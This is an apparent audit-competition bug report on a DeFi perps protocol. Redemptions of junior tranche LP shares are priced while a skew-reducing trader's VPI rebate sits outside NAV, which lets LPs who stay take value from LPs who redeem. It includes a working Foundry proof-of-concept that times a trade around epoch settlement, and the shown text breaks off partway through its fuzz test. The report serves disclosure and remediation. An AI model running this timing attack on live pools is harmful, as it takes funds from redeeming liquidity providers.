# \#99264 [SC-Critical] Junior redemptions are priced while a skew-reducing VPI rebate is outstanding but not counted in NAV, even though its clawback is certain, so a junior LP who stays takes q·r from the junior LPs who redeem

**Submitted on Nov 12th 2026 at 18:20:50 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99264
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

When a trader opens a position that reduces skew, the pool pays the trader a VPI rebate `r` out of HousePool cash. The rebate is locked in the trader's nonwithdrawable VPI reserve in MarginClearinghouse, which is outside `HousePool.totalAssets()`. When the position closes, the lifetime VPI clamp guarantees the pool gets at least `r` back. So `r` is a certain receivable. But the terminal-NAV snapshot that prices LP exits has no term for it, and junior is first-loss, so `juniorPrincipal` absorbs the whole `−r`.

`settleLpEpoch` prices and funds matured junior redemptions from that understated `juniorPrincipal` in the same call. A junior LP whose redemption is funded while the rebate is outstanding is paid `q·r` too little, where `q` is its share of junior supply. After the position closes, the clawback restores `r` to the pool, and the junior LPs who stayed keep the redeemer's `q·r`.

The attack is fully permissionless. A large junior LP who stays opens the skew-reducing position just before `router.settleLpEpoch` and closes it just after. No trusted role is involved.

### Vulnerability Details

**1. The rebate leaves pool cash.** The open plan pays the rebate from pool cash and sizes the trader's reserve to `max(-vpiAccrued, 0)`:

```solidity
// src/libraries/CfdEnginePlanLib.sol:331-333
delta.tradeCostAssets = openState.tradeCostAssets;
delta.marginDeltaAssets = order.marginDelta;
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

The reserve is credited in MarginClearinghouse (`src/MarginClearinghouse.sol:851`, `:864`: `vpiRebateReserveBalances[account] += amountAssets;`). After the open, `HousePool.totalAssets()` (`src/HousePool.sol:426`) is lower by `r`.

**2. The clawback is certain.** On close, lifetime VPI can never end negative:

```solidity
// src/libraries/CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. ...
@> if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
@>     state.vpiDeltaAssets = -state.proportionalAccrualAssets;
@> }
```

So a close always pays back at least the rebate it received. If pool depth fell in the meantime, it pays more (`k·S²/(2·D_close)`, which is not capped from above). Liquidation also recovers the rebate from the dedicated reserve (SECURITY.md:1436). The pool will get `r` back. This is not a risk estimate.

**3. The NAV snapshot has no receivable for it.** The snapshot that prices LP entry and exit:

```solidity
// src/libraries/HousePoolAccountingLib.sol:57-78
/// @notice Builds the single canonical terminal-NAV snapshot shared by LP entry and exit pricing.
function buildReconcileSnapshot(...) internal pure returns (ReconcileSnapshot memory snapshot) {
@>  uint256 terminalAssets = engineSnapshot.physicalAssets;           // excludes the MC VPI reserve
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets; // price book only, no VPI
    ...
    snapshot.distributable = terminalAssets - terminalLiabilities;
}
```

Junior is first-loss, so `_reconcile` (`src/HousePool.sol:1555-1599`) books the whole `−r` against `juniorPrincipal`.

**4. The redemption is priced and paid in that same state.**

```solidity
// src/HousePool.sol:835-841
@> _reconcile(accountingSnapshot, statusSnapshot);          // juniorPrincipal now J − r
   _checkpointEngineCarryIndexes();
   result.cutoffEpoch = cutoffEpoch;
   RedemptionPhase memory juniorPhase;
@> juniorPhase.pricingPrincipal = juniorPrincipal;          // priced at J − r
   juniorPhase.pricingSupply = _juniorShareSupply();
...
// src/HousePool.sol:881-887
   juniorPhase = _fundRedemptionPhase(juniorVault, result.cutoffEpoch, juniorPhase, ...);
   if (juniorPhase.fundedAssets > 0) {
@>     juniorPrincipal -= juniorPhase.fundedAssets;         // redeemer leaves with (J − r)·q
       accountedAssets -= juniorPhase.fundedAssets;
   }
```

Each redeemed junior share is paid `(J − r)/supply` instead of `J/supply` (`_fundRedemptionPhase`, `src/HousePool.sol:944-1004`).

**5. The stayers keep the difference.** When the position closes after the settlement, step 2 returns `r` (or more) to pool cash. The next reconcile credits it to the junior shares that are left. Net transfer: the redeemers lose `q·r` and the stayers gain `q·r`. Any extra close VPI `E` also goes to the stayers.

The protocol's own NAV rules say a receivable should count. SECURITY.md:851 says "LP entry and exit pricing consume the same authenticated terminal snapshot", and SECURITY.md:861 says "marked receivables affect ownership pricing but remain unavailable to fund redemptions until physically collected". The VPI rebate clawback is a receivable that code makes certain (step 2) and a dedicated reserve fully backs. Even so, it does not affect ownership pricing at all. SECURITY.md:872 says anticipated VPI and its reserve do not enter symmetric NAV. No document says this lets the LPs who stay take value from the LPs who redeem. The Known Limitations section (SECURITY.md:1328-1456, VPI limitations :1434-1444) does not list it either.

**Who is affected.**
- **Senior is not affected.** Senior redemptions in the same settlement are priced from `seniorPrincipal` (`src/HousePool.sol:846-852`), and junior first-loss shields it. In the PoC the senior redeemer gets exactly 500,009.13 USDG in both twins.
- **Precondition.** The junior redemption must actually be funded in that settlement. Junior settlement capacity is `min(freeAssets, juniorPrincipal, ratioCap)` (`src/HousePool.sol:1205-1217`). Under the release 80 % senior-share cap, `ratioCap` keeps junior at or above 25 % of senior exposure (`src/libraries/HousePoolSeniorCapacityLib.sol:64-90`). So any book where junior stays above that floor after the redemption is exposed. For example, with 4M senior, any junior tranche larger than 1M.

### Impact Details

Release parameters: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, execution fee 4 bp, MM/IM 10/20 bp, senior cap 40M / 80 %. The mark price is flat, so there is no price PnL. Every trade is self-executed through the real `OrderRouter`, and the settlement goes through the permissionless `router.settleLpEpoch`. "Base" is the identical twin without the skew-reducing open.

**Attacker = a junior LP who stays** (`test_redeemSide_attackerStayer_poc`): senior 4.0M; victim junior LP VIC 2.0M (redeems everything); attacker junior LP ATT 1.5M (stays). An honest LONG of 2.99M creates the skew, and the attacker opens a 2.99M SHORT 60 s before the epoch boundary and closes it 30 s after. Pool depth at the open is 7,507,958 USDG.

| Quantity | USDG |
|---|---|
| Rebate `r` (still in the MC reserve at settlement, 0 after close) | 5,953.74 |
| VIC redemption, base / attack | 2,003,362.12 / 1,999,960.94 |
| **Victim loss** (`q·r`, q = 0.5717) | **3,401.17** |
| Execution fees paid to treasury | 2,392.00 |
| Attacker trader net (fees + extra close VPI `E` = 2,170.76) | −4,562.76 |
| Attacker junior stake gain | +5,568.22 |
| **Attacker net after all fees** | **+1,005.46** |

**No attacker** (`test_redeemSide_honestRebate_noAttacker`): the same transfer happens with only honest users. An honest SHORT is open across the settlement. Senior 4M; junior 1M VIC (redeems) plus two honest 1M stayers; `r` = 5,554.07. Compared with the same book without that SHORT, the redeemer gets **1,850.74 USDG less** (`q·r`, q = 1/3) and each stayer gets +1,392.80 (`(q·r + E)/2`).

**Fuzzed differential** (`testFuzz_redeemSide_lossEqualsQr`, 256 runs at seed 1101): fuzzes victim, attacker and honest stakes, skew from 10 % to 39 %, and attacker or honest trader. In every fully funded case:
- the victim loss equals `q·r` within 1 %,
- the reserve equals `r` at settlement and is 0 after the close,
- the senior stayer is unchanged.

**Break-even.** The rebate is `r = k·S²/(2D)` and the round-trip fee is `F = 2·f·S` (k = 0.01, f = 4 bp, S = σ·D). An attacker who owns almost all of the remaining junior nets about `q·r − F`. That is profitable when `q > 4f/(k·σ) = 0.16/σ`, i.e. `q > 0.41` at σ = 0.39. The sweep (`test_redeemSide_sweep`, senior 4M, σ = 0.39) matches:

| Victim share q | Victim loss | Attacker net |
|---|---|---|
| 0.333 | 1,772.05 | −413.27 |
| 0.571 | 3,243.90 | +904.36 |
| 0.714 | 4,426.61 | +1,867.95 |
| 0.806 | 6,223.65 | +3,036.29 |

The fifth sweep row (junior 9M victim / 1.2M attacker) is bound by the ratio cap: the victim's redemption is only partly funded in that settlement (8,664,014,270,579,176 of 9,006,003,996,654,428 shares in the attack twin), so its 10,758.25 "loss" includes deferred shares and is not counted here.

The loss per settlement is bounded by `r ≈ k·σ²·D/2`, which is at most about 0.08 % of pool depth at the 40 % skew cap. It scales linearly with pool size, and the attacker can repeat it at every settlement that funds a large junior redemption. The attack costs no capital beyond the trade margin, which is returned.

### Mitigation

Count the certain clawback as a pool receivable in the snapshot that prices LP exits:

- Keep an aggregate of the outstanding MC VPI rebate reserves. Today only the per-account `vpiRebateReserveBalances[account]` exists (`src/MarginClearinghouse.sol:851`, `:864`, `:879`, `:901`), so the aggregate has to be updated on every reserve fund, release and consume, and passed into `HousePoolInputSnapshot`.
- In `buildReconcileSnapshot`, add it to `terminalAssets`. The reserve balance is a safe cap, because close and liquidation both recover the clawback from that reserve (SECURITY.md:866-868, :1436). It must not count toward the free cash used to fund redemptions (`buildWithdrawalSnapshot`). This matches SECURITY.md:861.
- Note that this also lowers `snapshot.deficit` by the reserve amount. That is collateral-backed, but the deposit gate `_entryStatusBlocked` (`src/HousePool.sol:1144`) reads `deficit`, so the change has to be reviewed there too.

A simpler alternative is to keep the rebate in pool custody, earmarked for the trader, until the position closes, so that `physicalAssets` never drops by `r`.

### References

- `src/libraries/CfdEnginePlanLib.sol:331-333`, `:343-356`: rebate paid from pool cash, reserve sized to `max(-vpiAccrued, 0)`
- `src/MarginClearinghouse.sol:851`, `:864`: reserve credited outside `HousePool.totalAssets()`
- `src/libraries/CloseAccountingLib.sol:112-118`: lifetime clamp makes the clawback certain
- `src/libraries/HousePoolAccountingLib.sol:57-78`: `buildReconcileSnapshot`, no VPI receivable term
- `src/HousePool.sol:1555-1599`: `_reconcile`, junior first-loss absorbs `−r`
- `src/HousePool.sol:835-841`, `:881-887`, `:944-1004`: redemption priced and funded from the post-reconcile `juniorPrincipal`
- `src/HousePool.sol:846-852`: senior priced from `seniorPrincipal` (unaffected)
- `src/HousePool.sol:1205-1217`, `src/libraries/HousePoolSeniorCapacityLib.sol:64-90`: junior settlement capacity (precondition)
- `src/OrderRouter.sol:479`: permissionless `settleLpEpoch`
- SECURITY.md:851, :861, :872, :1328-1456


## Proof of Concept

## Proof of Concept


Uses only the repo fixture `BasePerpTest` with release risk parameters (`DEPLOYMENT.md:131-142`) and the release senior cap (40M / 80 %, `DEPLOYMENT.md:154-155`, set through the normal owner timelock in `setUp` before any position exists). Every trade is a self-executed order through the real `OrderRouter` (`commitOrder` + `executeOrder` by the trader itself), and the LP settlement is the permissionless `router.settleLpEpoch`. No role is pranked, and no storage is written directly.

Each test runs two twins from the same snapshot: base (no skew-reducing open) and attack (with it). Everything else, including timestamps, marks and redemption requests, is identical.

- `test_redeemSide_attackerStayer_poc`: the attacker is a junior LP who stays; victim loss and attacker net after all fees.
- `test_redeemSide_honestRebate_noAttacker`: the same transfer with only honest users.
- `test_redeemSide_seniorRedeemer`: a senior redemption in the same settlement is unaffected.
- `test_redeemSide_sweep`: break-even over the victim share `q`.
- `testFuzz_redeemSide_lossEqualsQr`: the loss equals `q·r` over fuzzed books.

Save as `packages/perps/test/perps/audit/VpiRebateRedeemSideNav.t.sol` and run from `plether-core/`:

```
forge test --root packages/perps --match-path test/perps/audit/VpiRebateRedeemSideNav.t.sol --fuzz-seed 1101 --gas-limit 100000000000 --disable-block-gas-limit -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: save as packages/perps/test/perps/audit/VpiRebateRedeemSideNav.t.sol and run from plether-core/
///         forge test --root packages/perps --match-path test/perps/audit/VpiRebateRedeemSideNav.t.sol --fuzz-seed 1101 -vv
/// @notice A skew-reducing open receives a VPI rebate out of pool cash. The rebate sits in the trader's MC VPI reserve
///         (outside HousePool.totalAssets / LP NAV) although the lifetime clamp makes its return to the pool certain on
///         close. A junior redemption funded by settleLpEpoch while the rebate is outstanding is paid at the understated
///         junior principal; after the close claws the rebate back, the remaining junior holders keep the difference.
///         Every trade and the LP settlement go through the real Router (self-executed orders, router.settleLpEpoch);
///         no pranked roles, no stdstore.
contract VpiRebateRedeemSideNavPoC is BasePerpTest {

    address internal constant SEN = address(0x5E1); // senior LP that stays
    address internal constant SVIC = address(0x5E2); // senior LP that redeems in the same settlement
    address internal constant VIC = address(0xB1C7); // junior LP that redeems (victim)
    address internal constant ATT = address(0xA77AC4); // junior LP that stays + skew-reducing trader (attacker)
    address internal constant HON = address(0x40E5); // honest junior LP that stays
    address internal constant BG = address(0xB6B6); // honest LONG trader creating the skew
    address internal constant HSH = address(0x5407); // honest SHORT trader (no-attacker case)

    uint256 internal stagedBasketPrice = 100_000_000;
    uint256 internal stagedBasketTime = SETUP_TIMESTAMP;
    uint256 internal constant PRICE = 1e8;

    struct Cfg {
        uint256 senior; // senior LP SEN
        uint256 seniorVic; // senior LP SVIC deposit (redeems fully in the window) - 0 = none
        uint256 vicJr; // junior LP VIC (redeems fully in the window)
        uint256 attJr; // junior LP ATT (stays)
        uint256 honJr; // junior LP HON (stays)
        uint256 bgSize; // honest LONG size (1e18 = 1 USD notional at 1e8)
        uint256 rebSize; // skew-reducing SHORT size
        bool honestTrader; // true: the SHORT is opened by HSH long before the settle and held (no attacker)
    }

    struct Res {
        bool opened;
        uint256 rebate; // VPI rebate received by the SHORT at open (= -vpiAccrued)
        uint256 reserveAtSettle; // MC VPI rebate reserve of the SHORT at settlement time
        uint256 jrNavBeforeSettle; // juniorVault.totalAssets() right before router.settleLpEpoch
        uint256 jrPrincipalAfterSettle; // pool.juniorPrincipal() right after settlement (post redemption)
        uint256 vicClaimableAtSettle; // VIC redeem shares funded by that settlement
        uint256 reserveAfterClose;
        uint256 jrNavAfterClose; // juniorVault.totalAssets() after the SHORT closed
        uint256 vicShares;
        uint256 vicAssets; // USDG VIC receives
        uint256 vicUnfilled;
        uint256 sVicShares;
        uint256 sVicAssets;
        int256 traderNet; // SHORT trader MC balance - funded
        uint256 attValue; // value of ATT junior shares after everything
        uint256 honValue;
        uint256 senValue;
        uint256 treasury; // treasury MC credit during the window (exec fees)
        uint256 depthAtOpen;
    }

    // ---------------------------------------------------------------- config (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DEPLOYMENT.md:131-142 release values.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // Release senior-capacity config (DEPLOYMENT.md:154-155): 40M / 80 %. Owner timelock, no positions open yet.
        IHousePool.PoolConfig memory cfg = _currentPoolConfig();
        cfg.maxSeniorExposureAssets = 40_000_000e6;
        cfg.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(cfg);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        assertEq(engine.executionFeeBps(), 4, "release 4 bp execution fee");
    }

    // ---------------------------------------------------------------- helpers

    function _requestDeposit(
        TrancheVault vault,
        address owner,
        uint256 assets
    ) internal returns (uint256 requestId) {
        settlementToken.mint(owner, assets);
        vm.startPrank(owner);
        settlementToken.approve(address(vault), assets);
        requestId = vault.requestDeposit(assets, owner, owner);
        vm.stopPrank();
    }

    function _claimDeposit(
        TrancheVault vault,
        uint256 requestId,
        address controller
    ) internal returns (uint256 shares) {
        uint256 assets = vault.claimableDepositRequest(requestId, controller);
        assertGt(assets, 0, "deposit settled");
        vm.prank(controller);
        shares = vault.claimDeposit(requestId, assets, controller, controller);
    }

    function _setBasket(
        uint256 price,
        uint256 publishTime
    ) internal {
        stagedBasketPrice = price;
        stagedBasketTime = publishTime;
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime);
    }

    function _basketUpdate() internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(stagedBasketPrice)), 0, -8, stagedBasketTime, 0)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    /// @dev Permissionless mark refresh through the real Router.
    function _refreshMark() internal {
        _setBasket(PRICE, vm.getBlockTimestamp());
        router.updateMarkPrice(_basketUpdate());
    }

    /// @dev Self-executed order through the real Router (commit + execute by the account itself).
    function _routerTrade(
        address who,
        CfdTypes.Side side,
        uint256 size,
        bool isClose
    ) internal returns (uint256 funded) {
        uint256 margin;
        if (!isClose) {
            margin = (size / 1e12) / 20; // 5 % margin
            funded = margin * 2;
            _fundTrader(who, funded);
        }
        _refreshMark();
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory upd = _mockPythUpdateData(PRICE);
        vm.prank(who);
        router.executeOrder(id, upd);
    }

    /// @dev Same time/block step as `_routerTrade` without trading (twin alignment).
    function _idleStep() internal {
        _refreshMark();
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _posSize(
        address who
    ) internal view returns (uint256 sz) {
        (sz,,,,,,) = engine.positions(who);
    }

    function _vpiAccrued(
        address who
    ) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(who);
    }

    // ---------------------------------------------------------------- scenario

    function _scenario(
        Cfg memory c,
        bool withRebate
    ) internal returns (Res memory r) {
        uint256 attShares;
        uint256 honShares;
        uint256 senShares;
        // 1. Junior LPs enter (no positions -> permissionless cached settlement).
        {
            uint256 idV = _requestDeposit(juniorVault, VIC, c.vicJr);
            uint256 idA = c.attJr != 0 ? _requestDeposit(juniorVault, ATT, c.attJr) : 0;
            uint256 idH = c.honJr != 0 ? _requestDeposit(juniorVault, HON, c.honJr) : 0;
            vm.warp(pool.lpEpochStart(idV));
            _refreshMark();
            pool.settleLpEpoch(0, 0);
            r.vicShares = _claimDeposit(juniorVault, idV, VIC);
            if (idA != 0) attShares = _claimDeposit(juniorVault, idA, ATT);
            if (idH != 0) honShares = _claimDeposit(juniorVault, idH, HON);
        }
        // 2. Senior LPs enter (needs junior first under the 80 % share cap).
        {
            uint256 idS = _requestDeposit(seniorVault, SEN, c.senior);
            uint256 idSV = c.seniorVic != 0 ? _requestDeposit(seniorVault, SVIC, c.seniorVic) : 0;
            vm.warp(pool.lpEpochStart(idS));
            _refreshMark();
            pool.settleLpEpoch(0, 0);
            senShares = _claimDeposit(seniorVault, idS, SEN);
            if (idSV != 0) r.sVicShares = _claimDeposit(seniorVault, idSV, SVIC);
        }
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);

        // 3. Honest skew: LONG near the 40 % skew cap.
        _routerTrade(BG, CfdTypes.Side.LONG, c.bgSize, false);
        require(_posSize(BG) == c.bgSize, "bg open failed");

        address trader = c.honestTrader ? HSH : ATT;
        uint256 funded;
        uint256 treasuryBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        // 3b. No-attacker case: an honest SHORT opens well before the redemption request and is still open at settle.
        if (c.honestTrader) {
            r.depthAtOpen = pool.totalAssets();
            if (withRebate) {
                funded = _routerTrade(HSH, CfdTypes.Side.SHORT, c.rebSize, false);
                r.opened = _posSize(HSH) == c.rebSize;
                r.rebate = uint256(-_vpiAccrued(HSH));
            } else {
                _idleStep();
            }
        }

        // 4. LP redemption requests for the coming epoch (identical in both twins).
        vm.prank(VIC);
        uint256 rid = juniorVault.requestRedeem(r.vicShares, VIC, VIC);
        uint256 srid;
        if (r.sVicShares != 0) {
            vm.prank(SVIC);
            srid = seniorVault.requestRedeem(r.sVicShares, SVIC, SVIC);
            require(srid == rid, "same epoch");
        }
        uint256 boundary = pool.lpEpochStart(rid);

        // 5. Attacker: skew-reducing SHORT right before the boundary.
        vm.warp(boundary - 60);
        if (!c.honestTrader) {
            r.depthAtOpen = pool.totalAssets();
            if (withRebate) {
                funded = _routerTrade(ATT, CfdTypes.Side.SHORT, c.rebSize, false);
                r.opened = _posSize(ATT) == c.rebSize;
                r.rebate = uint256(-_vpiAccrued(ATT));
            } else {
                _idleStep();
            }
        }

        // 6. Permissionless atomic settlement at the boundary (real Router path).
        vm.warp(boundary);
        r.jrNavBeforeSettle = juniorVault.totalAssets();
        r.reserveAtSettle = clearinghouse.vpiRebateReserveAssets(trader);
        _setBasket(PRICE, boundary);
        router.settleLpEpoch(_basketUpdate());
        r.jrPrincipalAfterSettle = pool.juniorPrincipal();
        r.vicClaimableAtSettle = juniorVault.claimableRedeemRequest(rid, VIC);

        // 7. SHORT closes after the settlement: the lifetime clamp claws the rebate back into pool cash.
        vm.warp(boundary + 30);
        if (withRebate && r.opened) {
            _routerTrade(trader, CfdTypes.Side.SHORT, c.rebSize, true);
            require(_posSize(trader) == 0, "close failed");
        } else {
            _idleStep();
        }
        r.reserveAfterClose = clearinghouse.vpiRebateReserveAssets(trader);
        r.jrNavAfterClose = juniorVault.totalAssets();

        // 8. Claims and valuation.
        {
            uint256 claimable = juniorVault.claimableRedeemRequest(rid, VIC);
            if (claimable != 0) {
                vm.prank(VIC);
                r.vicAssets = juniorVault.claimRedeem(rid, claimable, VIC, VIC);
            }
            r.vicUnfilled = r.vicShares - claimable;
        }
        if (srid != 0) {
            uint256 claimable = seniorVault.claimableRedeemRequest(srid, SVIC);
            if (claimable != 0) {
                vm.prank(SVIC);
                r.sVicAssets = seniorVault.claimRedeem(srid, claimable, SVIC, SVIC);
            }
        }
        r.traderNet = int256(clearinghouse.balanceAssets(trader)) - int256(funded);
        r.attValue = juniorVault.convertToAssets(attShares);
        r.honValue = juniorVault.convertToAssets(honShares);
        r.senValue = seniorVault.convertToAssets(senShares);
        r.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryBefore;
    }

    function _run(
        Cfg memory c
    ) internal returns (Res memory base, Res memory atk) {
        uint256 snap = vm.snapshotState();
        base = _scenario(c, false);
        vm.revertToState(snap);
        atk = _scenario(c, true);
        vm.revertToStateAndDelete(snap);
    }

    function _d(
        uint256 a,
        uint256 b
    ) internal pure returns (int256) {
        return int256(a) - int256(b);
    }

    function _logUsd(
        string memory k,
        int256 v
    ) internal pure {
        // prints value in USDG with 2 decimals
        int256 cents = v / 1e4;
        uint256 abs = cents < 0 ? uint256(-cents) : uint256(cents);
        console2.log(string.concat(k, cents < 0 ? " -" : " "), abs / 100, abs % 100);
    }

    struct Summary {
        int256 victimLoss;
        int256 attStakeGain;
        int256 attNet;
        int256 honGain;
        int256 senGain;
        int256 seniorVicDiff;
    }

    function _report(
        string memory tag,
        Cfg memory c,
        Res memory b,
        Res memory a
    ) internal pure returns (Summary memory s) {
        s.victimLoss = _d(b.vicAssets, a.vicAssets);
        s.attStakeGain = _d(a.attValue, b.attValue);
        s.attNet = c.honestTrader ? s.attStakeGain : s.attStakeGain + a.traderNet;
        s.honGain = _d(a.honValue, b.honValue);
        s.senGain = _d(a.senValue, b.senValue);
        s.seniorVicDiff = _d(a.sVicAssets, b.sVicAssets);
        console2.log("=====", tag);
        console2.log("senior/seniorVic/vicJr/attJr/honJr (USDG)", c.senior / 1e6, c.seniorVic / 1e6);
        console2.log("   ", c.vicJr / 1e6, c.attJr / 1e6, c.honJr / 1e6);
        console2.log("bgSize/rebSize (USD notional)", c.bgSize / 1e18, c.rebSize / 1e18);
        console2.log("pool depth at SHORT open", a.depthAtOpen / 1e6);
        _logUsd("rebate r (USDG)", int256(a.rebate));
        _logUsd("reserve at settle (atk twin)", int256(a.reserveAtSettle));
        _logUsd("reserve after close (atk twin)", int256(a.reserveAfterClose));
        _logUsd("junior NAV before settle  base", int256(b.jrNavBeforeSettle));
        _logUsd("junior NAV before settle  atk ", int256(a.jrNavBeforeSettle));
        _logUsd("juniorPrincipal after settle base", int256(b.jrPrincipalAfterSettle));
        _logUsd("juniorPrincipal after settle atk ", int256(a.jrPrincipalAfterSettle));
        _logUsd("junior NAV after close base", int256(b.jrNavAfterClose));
        _logUsd("junior NAV after close atk ", int256(a.jrNavAfterClose));
        console2.log("VIC shares / funded-at-settle base / atk", a.vicShares, b.vicClaimableAtSettle, a.vicClaimableAtSettle);
        _logUsd("VIC redeem assets base", int256(b.vicAssets));
        _logUsd("VIC redeem assets atk ", int256(a.vicAssets));
        _logUsd("SVIC senior redeem assets base", int256(b.sVicAssets));
        _logUsd("SVIC senior redeem assets atk ", int256(a.sVicAssets));
        _logUsd("treasury exec fees (atk twin)", int256(a.treasury));
        _logUsd("SHORT trader net (atk twin)", a.traderNet);
        _logUsd("VICTIM LOSS (junior redeemer)", s.victimLoss);
        _logUsd("ATT junior stake gain", s.attStakeGain);
        _logUsd("ATT NET (stake gain + trader net)", s.attNet);
        _logUsd("HON junior stayer gain", s.honGain);
        _logUsd("SEN senior stayer gain", s.senGain);
        _logUsd("SVIC senior redeemer diff", s.seniorVicDiff);
    }

    // ---------------------------------------------------------------- tests

    /// @notice Attacker = large junior stayer. Victim junior LP redeems 2M of a 3.5M junior tranche (q = 0.571);
    ///         attacker opens the skew-reducing SHORT 60 s before router.settleLpEpoch and closes 30 s after.
    function test_redeemSide_attackerStayer_poc() public {
        Cfg memory c;
        c.senior = 4_000_000e6;
        c.vicJr = 2_000_000e6;
        c.attJr = 1_500_000e6;
        c.bgSize = 2_990_000e18;
        c.rebSize = 2_990_000e18;
        (Res memory b, Res memory a) = _run(c);
        Summary memory s = _report("attacker-stayer", c, b, a);

        assertTrue(a.opened, "skew-reducing open executed");
        assertGt(a.rebate, 0, "open received a VPI rebate");
        // Timing: rebate outstanding when the settlement prices and funds the redemption ...
        assertEq(a.reserveAtSettle, a.rebate, "rebate still outside NAV at settlement");
        assertEq(a.vicClaimableAtSettle, a.vicShares, "victim redemption fully funded in that settlement");
        assertEq(b.vicClaimableAtSettle, b.vicShares, "victim redemption fully funded (base)");
        assertLt(a.jrNavBeforeSettle, b.jrNavBeforeSettle, "junior NAV understated at settlement");
        // ... and the clawback lands only afterwards.
        assertEq(a.reserveAfterClose, 0, "rebate clawed back on close");
        assertGt(s.victimLoss, 0, "victim redeemer paid below twin");
        assertGt(s.attNet, 0, "attacker net positive after all fees");
    }

    /// @notice No attacker: an honest trader's skew-reducing SHORT is open across the settlement. The honest junior
    ///         redeemer is paid q*r less; the junior stayers (both honest) keep it once the SHORT closes.
    function test_redeemSide_honestRebate_noAttacker() public {
        Cfg memory c;
        c.senior = 4_000_000e6;
        c.vicJr = 1_000_000e6;
        c.attJr = 1_000_000e6; // honest stayer #1 (does not trade here)
        c.honJr = 1_000_000e6; // honest stayer #2
        c.bgSize = 2_790_000e18;
        c.rebSize = 2_790_000e18;
        c.honestTrader = true;
        (Res memory b, Res memory a) = _run(c);
        Summary memory s = _report("honest-no-attacker", c, b, a);
        assertTrue(a.opened, "honest SHORT opened");
        assertEq(a.reserveAtSettle, a.rebate, "rebate outstanding at settlement");
        assertEq(a.vicClaimableAtSettle, a.vicShares, "redemption funded in that settlement");
        assertGt(s.victimLoss, 0, "honest redeemer loses");
        assertGt(s.honGain, 0, "honest stayer gains");
    }

    /// @notice Senior check: a senior redemption funded in the same settlement is priced off seniorPrincipal, which
    ///         the junior first-loss waterfall shields from the rebate.
    function test_redeemSide_seniorRedeemer() public {
        Cfg memory c;
        c.senior = 4_000_000e6;
        c.seniorVic = 500_000e6;
        c.vicJr = 2_000_000e6;
        c.attJr = 1_500_000e6;
        c.bgSize = 3_190_000e18;
        c.rebSize = 3_190_000e18;
        (Res memory b, Res memory a) = _run(c);
        Summary memory s = _report("senior-redeemer", c, b, a);
        assertGt(a.sVicAssets, 0, "senior redemption funded");
        assertEq(s.seniorVicDiff, 0, "senior redeemer unaffected");
        assertGt(s.victimLoss, 0, "junior redeemer still loses");
    }

    /// @notice Sweep over victim share q and attacker stake for the break-even table.
    function test_redeemSide_sweep() public {
        uint256[5] memory vicJr = [uint256(1_000_000e6), 2_000_000e6, 3_000_000e6, 5_000_000e6, 9_000_000e6];
        uint256[5] memory attJr = [uint256(2_000_000e6), 1_500_000e6, 1_200_000e6, 1_200_000e6, 1_200_000e6];
        for (uint256 i; i < 5; ++i) {
            Cfg memory c;
            c.senior = 4_000_000e6;
            c.vicJr = vicJr[i];
            c.attJr = attJr[i];
            uint256 depth = c.senior + c.vicJr + c.attJr + 2000e6;
            uint256 sz = (depth * 39 / 100) / 1e6 / 10_000 * 10_000 * 1e18; // just under the 40 % skew cap
            c.bgSize = sz;
            c.rebSize = sz;
            (Res memory b, Res memory a) = _run(c);
            _report(string.concat("sweep-", vm.toString(i)), c, b, a);
        }
    }

    /// @notice Fuzzed book: whenever the victim redemption is fully funded in the window, its loss vs the twin is
    ///         q*r (q = victim share of junior supply, r = outstanding rebate) within 1 %.
    function testFuzz_redeemSide_lossEqualsQr(uint256 vSeed, uint256 aSeed, uint256 hSeed, uint256 skewBps, bool honest) public {
        Cfg memory c;
        c.senior = 4_000_000e6;
        c.vicJr = bound(vSeed, 200_000, 6_000_000) * 1e6;
        c.attJr = bound(aSeed, 1_050_000, 3_000_000) * 1e6;
        c.honJr = bound(hSeed, 0, 2_000_000) * 1e6;
